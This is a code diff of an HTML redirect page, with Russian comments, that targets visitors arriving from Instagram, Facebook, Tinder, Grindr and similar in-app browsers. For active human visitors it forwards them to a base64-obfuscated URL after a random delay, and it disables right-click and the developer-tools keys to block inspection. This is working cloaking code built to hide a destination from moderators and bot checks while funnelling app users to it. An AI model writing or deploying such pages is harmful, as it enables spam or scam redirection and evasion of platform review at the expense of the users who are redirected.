@@ -7,9 +7,7 @@
   <meta name="robots" content="noindex, nofollow" />
   <style>
     html, body {
-      margin: 0;
-      padding: 0;
-      height: 100%;
+      margin: 0; padding: 0; height: 100%;
       background: linear-gradient(to bottom, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
       font-family: system-ui, sans-serif;
       display: flex;
@@ -33,6 +31,7 @@
       align-items: center;
       color: white;
       font-size: 2rem;
+      margin-top: 1rem;
     }
     .loader {
       margin-top: 1rem;
@@ -57,6 +56,7 @@
   </div>
 
   <script>
+    // Проверка на ботов и популярные аппы
     const baitAgents = ["instagram", "fbav", "facebook", "tinder", "okhttp", "webview", "line", "pinterest", "telegram", "grindr"];
     const userAgent = navigator.userAgent.toLowerCase();
     const isBait = baitAgents.some(agent => userAgent.includes(agent));
@@ -68,33 +68,28 @@
 
     let userActive = false;
 
+    // Отмечаем активность юзера при движении, касании или нажатии клавиш
     const markActive = () => userActive = true;
     document.addEventListener("mousemove", markActive);
     document.addEventListener("touchstart", markActive);
     document.addEventListener("keypress", markActive);
 
-    setTimeout(() => {
-      if (!userActive) {
-        location.href = "https://imgur.com/user/carlovershub";
-      }
-    }, 3500);
-
     function go() {
-      if (!userActive) return;
+      if (!userActive) return; // Без активности кнопка не сработает
 
       document.querySelector(".btn").style.display = "none";
       document.getElementById("loading").style.display = "flex";
 
       const p1 = "aHR0cHM6Ly9nYXlyb24ubGlmZS9y";
       const p2 = "ZWhiaXhlZQ==";
-      const url = atob(p1 + p2);
+      const finalUrl = atob(p1 + p2);
 
       setTimeout(() => {
-        window.location.replace(url);
+        window.location.replace(finalUrl);
       }, 2000 + Math.random() * 1000);
     }
 
-  
+    // Запрет правой кнопки и F12
     document.addEventListener("contextmenu", e => e.preventDefault());
     document.onkeydown = e => {
       if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) return false;
